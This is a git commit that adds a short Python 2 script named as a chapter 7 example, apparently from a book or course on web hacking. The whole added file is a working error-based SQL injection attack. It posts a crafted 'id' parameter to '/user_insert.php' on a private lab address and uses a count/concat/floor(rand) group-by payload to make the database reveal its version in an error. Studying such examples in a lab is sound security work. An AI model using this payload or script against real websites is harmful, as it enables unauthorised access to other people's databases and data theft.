98ce8b397f983adfbb1b353ee8c72f34d2867ac0
Hyunsu, Yoo <n3oism@gmail.com>
2018-08-18 09:24:08 +0900

    Python Error-Based SQL Injector

---
+++ examples/chap7/2.injector_database_version.py
@@ -0,0 +1,14 @@
+import httplib
+import urllib
+
+headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36", "Content-type": "application/x-www-form-urlencoded", "Accept": "text/html", "Connection": "keep-alive"}
+
+domain = "192.168.126.128"
+url = "/user_insert.php"
+params = "id=test\',(select x from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)T))#&name=test"
+
+conn = httplib.HTTPConnection(domain,"80")
+#conn = httplib.HTTPSConnection(domain,"443")
+conn.request("POST",url,params,headers)
+response=conn.getresponse().read()
+print response
